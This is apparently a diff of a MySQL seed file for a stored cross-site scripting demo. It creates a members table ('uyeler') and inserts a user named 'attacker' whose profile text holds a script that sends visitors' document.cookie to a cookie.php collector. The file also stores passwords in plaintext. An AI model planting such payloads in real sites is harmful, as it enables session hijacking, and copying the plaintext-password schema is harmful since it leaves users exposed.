@@ -1,6 +1,5 @@
-Database: test1
-Dump of table uyeler
-DROP TABLE IF EXISTS `uyeler`;
+CREATE DATABASE test1;
+use test1
 CREATE TABLE `uyeler` (
   `id` int(11) NOT NULL AUTO_INCREMENT,
   `kadi` varchar(255) NOT NULL,
@@ -10,11 +9,8 @@ CREATE TABLE `uyeler` (
   PRIMARY KEY (`id`)
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
 
-LOCK TABLES `uyeler` WRITE;
-/*!40000 ALTER TABLE `uyeler` DISABLE KEYS */;
-
 INSERT INTO `uyeler` (`id`, `kadi`, `sifre`, `eposta`, `hakkinda`)
 VALUES
 	(1,'ayberk','123123','ayberkctl@gmail.com','hakkımda'),
-	(2,'attacker','evilmesage','attacker@attacker.com','<script>window.location.href = \'cookie/cookie.php?cookie=\' + document.cookie;</script>');
-    UNLOCK TABLES;
+	(2,'attacker','122','attacker@attacker.com','<script>window.location.href = \'cookie/cookie.php?cookie=\' + document.cookie;</script>');
+
